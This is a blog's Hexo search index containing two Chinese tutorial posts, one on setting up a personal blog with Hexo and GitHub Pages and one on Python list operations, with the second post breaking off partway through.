<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>github+hexo搭建个人博客教程</title>
    <url>/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul>
<li>环境搭建<ul>
<li>安装node.js</li>
<li>安装git</li>
<li>安装Hexo</li>
</ul>
</li>
<li>github仓库的创建</li>
<li>githubSSH的配置</li>
<li>sublime的安装使用</li>
<li>Hexo与github连接</li>
<li>Hexo的主题切换<a id="more"></a>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2></li>
<li>安装node.js之前请先安装npm并了解相关知识</li>
</ul>
<p>Hexo基于node.js,所以我们需要现在计算机中安装<a href="https://nodejs.org/zh-cn/download/">node.js</a>.<br><img src="https://img-blog.csdnimg.cn/20210111144246737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">选择windows64位安装包下载，下载完后一路next就好啦。</p>
<p>检查node.js是否安装成功，win+r打开命令窗口，输入node -v<br><img src="https://img-blog.csdnimg.cn/20210112111604710.png" alt="node.js 检测"><br>出现版本号即安装成功</p>
<p>检查npm是否安装成功，在命令窗口下，输入npm -v<br><img src="https://img-blog.csdnimg.cn/20210112111804857.png" alt="npm 检测"><br>出现版本号即安装成功</p>
<p>好啦，到这里Hexo的环境已经搭建完毕了</p>
<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><h3 id="1、git下载"><a href="#1、git下载" class="headerlink" title="1、git下载"></a>1、git下载</h3><p>git的下载可以去官网下载<a href="https://www.git-scm.com/download%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BC%9A%E6%9C%89%E7%82%B9%E6%85%A2%E3%80%82">https://www.git-scm.com/download，但是会有点慢。</a><br>觉得慢的可以去这个网址下载链接：<a href="https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw">https://pan.baidu.com/s/1_nBfUmuRlilFQnVeoYALiw</a> 提取码：qivu </p>
<h3 id="2、git安装"><a href="#2、git安装" class="headerlink" title="2、git安装"></a>2、git安装</h3><p>1、下载完后双击安装程序Git-2.30.0-64-bit，进入安装界面，点击next：<br><img src="https://img-blog.csdnimg.cn/2021011216423378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、选择安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112164344294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、安装配置窗口，包括git命令行、git图形界面等：<br><img src="https://img-blog.csdnimg.cn/20210112164432241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、选择开始菜单文件：<br><img src="https://img-blog.csdnimg.cn/20210112164543529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>5、选择git的默认编译器，推荐vim：<br><img src="https://img-blog.csdnimg.cn/20210112164710774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>6、选择仓库的初始名称，选默认就好了：<br><img src="https://img-blog.csdnimg.cn/20210112164917618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>7、选择可以用windows命令行操作，也可用git bash操作：<br><img src="https://img-blog.csdnimg.cn/20210112165043808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>8、HTTPS传输后台，用默认的就行了：<br><img src="https://img-blog.csdnimg.cn/20210112165228493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>9、选择换行符，默认unix格式，如果检测到windows格式则自动转换为unix格式：<br><img src="https://img-blog.csdnimg.cn/20210112165331786.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>10、选择配置默认终端：<br><img src="https://img-blog.csdnimg.cn/20210112165500295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>11、选择git pull风格，推荐默认：<br><img src="https://img-blog.csdnimg.cn/20210112165533960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>12、选择凭据管理，推荐默认选项：<br><img src="https://img-blog.csdnimg.cn/20210112165642464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>13、配置额外的选项，选择文件缓存：<br><img src="https://img-blog.csdnimg.cn/20210112165731109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>14、这是新功能，不推荐选择：<br><img src="https://img-blog.csdnimg.cn/20210112165808234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>15、安装中：<br><img src="https://img-blog.csdnimg.cn/20210112165840223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>16、安装成功辣：<br><img src="https://img-blog.csdnimg.cn/20210112165902939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>17、在任意文件夹中，右键即可选择<br>Git GUI为git图形界面工具<br>Git Bash为命令行工具<br><img src="https://img-blog.csdnimg.cn/20210112170126809.png"></p>
<h2 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h2><h3 id="Hexo安装-1"><a href="#Hexo安装-1" class="headerlink" title="Hexo安装"></a>Hexo安装</h3><p>hexo是我们以后用于搭建个人博客的框架，所以最好先新建一个blog文件夹用于博客的管理，且hexo框架与以后写作发布的网页都会保存在这个文件夹当中。<br>创建好之后，打开命令行，切换至创建的文件夹中：<br><img src="https://img-blog.csdnimg.cn/20210112171614641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>使用npm命令安装hexo，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<p>耐心等待安装完成，安装完成之后，先初始化我们的博客，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init bolg</span><br></pre></td></tr></table></figure>
<p>tips：这些命令必须在我们创建的文件夹中使用。</p>
<p>此时我们检查一下我们网站的雏形，按顺序输入以下三条命令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> hello Hexo		<span class="comment">//新建一篇名为“hello Hexo”的博客</span></span><br><span class="line">hexo g					<span class="comment">//生成静态文件</span></span><br><span class="line">hexo s					<span class="comment">//本地部署预览</span></span><br></pre></td></tr></table></figure>
<p>到这里我们的网站已经初步成型了，可以输入localhost:4000进行访问。</p>
<h3 id="Hexo的常用命令"><a href="#Hexo的常用命令" class="headerlink" title="Hexo的常用命令"></a>Hexo的常用命令</h3><h4 id="初始化命令"><a href="#初始化命令" class="headerlink" title="初始化命令"></a>初始化命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo -g	<span class="comment">//安装hexo</span></span><br><span class="line">npm update hexo -g	<span class="comment">//更新hexo</span></span><br><span class="line">hexo init	<span class="comment">//初始化博客</span></span><br></pre></td></tr></table></figure>
<h4 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo n <span class="string">&quot;博客名称&quot;</span> = hexo <span class="keyword">new</span> <span class="string">&quot;博客名称&quot;</span>	<span class="comment">//新建一篇博客</span></span><br><span class="line">hexo g = hexo generate	<span class="comment">//生成</span></span><br><span class="line">hexo s = hexo server	<span class="comment">//启动服务器</span></span><br><span class="line">hexo d = hexo deploy	<span class="comment">//部署</span></span><br></pre></td></tr></table></figure>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hexo server	<span class="comment">//hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s	<span class="comment">//静态模式</span></span><br><span class="line">hexo server -p <span class="number">5000</span>	<span class="comment">//更改端口</span></span><br><span class="line">hexo server -i <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>	<span class="comment">//自定义 IP地址</span></span><br><span class="line">hexo clean	<span class="comment">//清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure>
<h1 id="github仓库的创建"><a href="#github仓库的创建" class="headerlink" title="github仓库的创建"></a>github仓库的创建</h1><p>好了，到这里确保上方操作无误即可进行github仓库的创建(但首先你得先有个github账号哦)。<br>进入github主页，选择左上角的new：<br><img src="https://img-blog.csdnimg.cn/20210112173349599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>进入后输入仓库名称，必须要与owner下的名称一致，输入完后点击创建即可<br>我已经创建过仓库了，所以会提示<br><img src="https://img-blog.csdnimg.cn/20210112173512148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
<p>进入git bash中，按顺序输入如下代码：</p>
<blockquote>
<p>git config –global user.email “<a href="mailto:&#120;&#x78;&#x78;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#120;&#x78;&#x78;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>“    //填写注册github的邮箱</p>
</blockquote>
<blockquote>
<p>git config –global user.name “xxxx”    //github 用户名</p>
</blockquote>
<blockquote>
<p>ssh-keygen    //输入完这个就一致enter就行了</p>
</blockquote>
<p>然后进入用户目录下的.ssh，打开id_rsa.pub，复制里面的内容。</p>
<p>进入github，新建一个SSH就可以了：</p>
<p><img src="https://img-blog.csdnimg.cn/20210112180408871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="sublime的安装使用"><a href="#sublime的安装使用" class="headerlink" title="sublime的安装使用"></a>sublime的安装使用</h1><p>sublime是一个好用的文本编辑器。</p>
<p>1、sublime下载<br>可以去官网下载：<a href="http://www.sublimetext.com/3">http://www.sublimetext.com/3</a><br>也可以云盘下载：<a href="https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw">https://pan.baidu.com/s/1hRvN9kMWXF56C_5YCVk_iw</a> 提取码：42pf </p>
<p>2、选择一个除C盘外的安装目录：<br><img src="https://img-blog.csdnimg.cn/20210112203141300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后点击next，安装完成：<br><img src="https://img-blog.csdnimg.cn/20210112203231376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>4、将博客目录拖入sublime：<br><img src="https://img-blog.csdnimg.cn/20210112210759495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Hexo与github连接"><a href="#Hexo与github连接" class="headerlink" title="Hexo与github连接"></a>Hexo与github连接</h1><p>1、在sublime中打开_config.yml，将Deployment改为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lucifer-rossweisse/lucifer-rossweisse.github.io.git	</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<p>其中”repo”内填写github仓库中的SSH链接<br><img src="https://img-blog.csdnimg.cn/20210112211302998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>2、将”url”后改为”<a href="http://github项目名&quot;/">http://github项目名&quot;</a><br><img src="https://img-blog.csdnimg.cn/20210112211442895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、在命令行中输入下列代码，安装插件，上传博客</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git config --global user.email <span class="string">&quot;github邮箱&quot;</span></span><br><span class="line">git config --global user.name <span class="string">&quot;github用户名&quot;</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>4、在浏览器中输入博客网址，也是github仓库名，即可查看(有时候需要等一会)<br><img src="https://img-blog.csdnimg.cn/20210112211855757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Hexo的主题切换"><a href="#Hexo的主题切换" class="headerlink" title="Hexo的主题切换"></a>Hexo的主题切换</h1><p>其实前面已经把重要的部分整完了，最后就换一个自己喜欢的主题就好了。</p>
<p>主题可以从github上搜hexo-them进行查找，比较受欢迎的是next和yilia这两个主题，以next为主，之后主题的切换都可以这么来。</p>
<p>1、进入博客文件夹，打开git bash，输入以下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
<p>安装完后可以看到博客文件夹中的themes里出现了一个next文件夹，这就是我们下载的next主题。<br><img src="https://img-blog.csdnimg.cn/20210112212458400.png"><br>2、修改主题配置文件，进入博客文件夹中的_config.yml修改主题<br><img src="https://img-blog.csdnimg.cn/20210112212618350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>3、然后先在本地测试一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210112212918907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p>4、最后直接上传发布博客就好了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>注意：hexo在5.0之后把swig给删除了，需要自己手动安装，不然安装next主题后会显示错误<br>输入下面这串代码安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
<p>然后hexo c清理缓存，hexo g &amp; s即可。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>全部的搭建步骤已经讲完了，写篇博客其实只是为了记录一下自己学习的搭建过程，如果对你有帮助的话，可以分享给你的朋友哦(￣▽￣)”</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>python列表的运用</title>
    <url>/2021/02/01/python%E5%88%97%E8%A1%A8%E7%9A%84%E8%BF%90%E7%94%A8/</url>
    <content><![CDATA[<h2 id="python列表的运用"><a href="#python列表的运用" class="headerlink" title="python列表的运用"></a>python列表的运用</h2><p>列表是python中内置的序列类型，与C语言中的数组有些类似，但实际上python中的列表更像是一种类，其中封装了许多种方法。</p>
<a id="more"></a>

<h3 id="1、如何定义一个列表list"><a href="#1、如何定义一个列表list" class="headerlink" title="1、如何定义一个列表list"></a>1、如何定义一个列表list</h3><p>这是最简单的列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113758182.png"></p>
<p>还可以数字与字符串混搭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list2 = [<span class="number">1</span>, <span class="string">&#x27;red&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="number">3</span>, <span class="string">&#x27;yellow&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113806526.png"></p>
<p>甚至可以在列表里加入列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list3 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e6a1a8840f884dd719dc49cd2ac0aa2f.png"></p>
<h3 id="2、列表的使用方法"><a href="#2、列表的使用方法" class="headerlink" title="2、列表的使用方法"></a>2、列表的使用方法</h3><h4 id="1、删除列表元素"><a href="#1、删除列表元素" class="headerlink" title="1、删除列表元素"></a>1、删除列表元素</h4><p>我们可以通过del语句来删除列表中的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> list1[<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cffcf388ca09f9c1152bed3187aca396.png"></p>
<p>tips:学过c语言的数组，我们都知道<strong>数组</strong>的下标是从0开始的，同样python中的<strong>列表</strong>也不例外，所以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> list1[<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p>删除的是下标为4的元素</p>
<h4 id="2、列表脚本操作符"><a href="#2、列表脚本操作符" class="headerlink" title="2、列表脚本操作符"></a>2、列表脚本操作符</h4><h5 id="1、长度操作"><a href="#1、长度操作" class="headerlink" title="1、长度操作"></a>1、长度操作</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(list1)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b873434af888df2abe5f73ff6be3d7ca.png"></p>
<h5 id="2、组合操作符"><a href="#2、组合操作符" class="headerlink" title="2、组合操作符"></a>2、组合操作符</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 + [<span class="number">5</span>] 或 [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>] + [<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020111382871.png"></p>
<h5 id="3、重复操作符"><a href="#3、重复操作符" class="headerlink" title="3、重复操作符"></a>3、重复操作符</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 * <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9129a2667adb0aa5630a45ee35d15996.png"></p>
<h5 id="4、内置迭代器"><a href="#4、内置迭代器" class="headerlink" title="4、内置迭代器"></a>4、内置迭代器</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> list1: print(x, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0592770187d406e3d1a9a72037366032.png"></p>
<h5 id="5、判断元素是否存在于表中"><a href="#5、判断元素是否存在于表中" class="headerlink" title="5、判断元素是否存在于表中"></a>5、判断元素是否存在于表中</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="keyword">in</span> list1</span><br><span class="line"><span class="number">5</span> <span class="keyword">not</span> <span class="keyword">in</span> list1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113843302.png"></p>
<p>tips：从这看，python这也太人性化了w(ﾟДﾟ)w</p>
<h4 id="3、列表的截取取与拼接"><a href="#3、列表的截取取与拼接" class="headerlink" title="3、列表的截取取与拼接"></a>3、列表的截取取与拼接</h4><h5 id="1、列表的截取"><a href="#1、列表的截取" class="headerlink" title="1、列表的截取"></a>1、列表的截取</h5><p>tips: python中的列表可以正向索引也可以反向索引。</p>
<p><strong>正向索引</strong><br><img src="https://img-blog.csdnimg.cn/20210201113855754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p><strong>反向索引</strong><br><img src="https://img-blog.csdnimg.cn/20210201113931263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p>所以，截取可以正向截取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201113951193.png"></p>
<p>可以反向截取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4887372c3996635cf4fd627a88de57eb.png"></p>
<p>还可以有范围的截取</p>
<p>tips：该范围为左闭右开区间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">1</span>:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7982975c1bcdcdc415a99e2248bec225.png"></p>
<p>甚至可以不加前后范围</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1[<span class="number">1</span>:]</span><br><span class="line">list1[:<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201114021435.png"></p>
<h5 id="2、列表的拼接"><a href="#2、列表的拼接" class="headerlink" title="2、列表的拼接"></a>2、列表的拼接</h5><p>列表里还支持拼接操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 += [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201114052460.png"></p>
<h4 id="4、列表函数"><a href="#4、列表函数" class="headerlink" title="4、列表函数"></a>4、列表函数</h4><h5 id="1、max"><a href="#1、max" class="headerlink" title="1、max()"></a>1、max()</h5><p>返回列表元素最大值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">max</span>(list1)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4b557e1d41910ac90d7efc4d1a6ea605.png"></p>
<h5 id="2、min"><a href="#2、min" class="headerlink" title="2、min()"></a>2、min()</h5><p>返回列表元素最小值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">min</span>(list1)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2b6e28cd5ccfaae5831f03044016f828.png"></p>
<h4 id="5、列表方法"><a href="#5、列表方法" class="headerlink" title="5、列表方法"></a>5、列表方法</h4><h5 id="1、list-append-obj"><a href="#1、list-append-obj" class="headerlink" title="1、list.append(obj)"></a>1、list.append(obj)</h5><p>在列表末尾添加新的对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.append(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/197986f29839747d215d40de04b8e512.png"></p>
<h5 id="2、list-count-obj"><a href="#2、list-count-obj" class="headerlink" title="2、list.count(obj)"></a>2、list.count(obj)</h5><p>统计某个元素在列表中出现的次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.count(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/2be88d94904197ecd299d9df20189625.png"></p>
<h5 id="3、list-extend-seq"><a href="#3、list-extend-seq" class="headerlink" title="3、list.extend(seq)"></a>3、list.extend(seq)</h5><p> 在列表末尾一次性追加另一个序列中的多个值（即用新列表扩展原来的列表）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.extend([<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>])</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/eae8df9e0c929655831788391c0340f8.png"></p>
<h5 id="4、list-insert-index-obj"><a href="#4、list-insert-index-obj" class="headerlink" title="4、list.insert(index, obj)"></a>4、list.insert(index, obj)</h5><p>将对象插入列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.insert(<span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b6b5ec0f8e1185a25d4cbacea2a1e049.png"></p>
<h5 id="5、list-index-obj"><a href="#5、list-index-obj" class="headerlink" title="5、list.index(obj)"></a>5、list.index(obj)</h5><p>从列表中找出某个值第一个匹配项的索引位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.index(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a60c93533ddf9915804d32e89c1e0ffe.png"></p>
<p>也可以自定义范围</p>
<p>tips：该范围为左闭右开区间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1.index(<span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b137c26fac142e9456dc28abcf5d4539.png"></p>
<h5 id="6、list-pop-index-1"><a href="#6、list-pop-index-1" class="headerlink" title="6、list.pop([index=-1])"></a>6、list.pop([index=-1])</h5><p>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p>
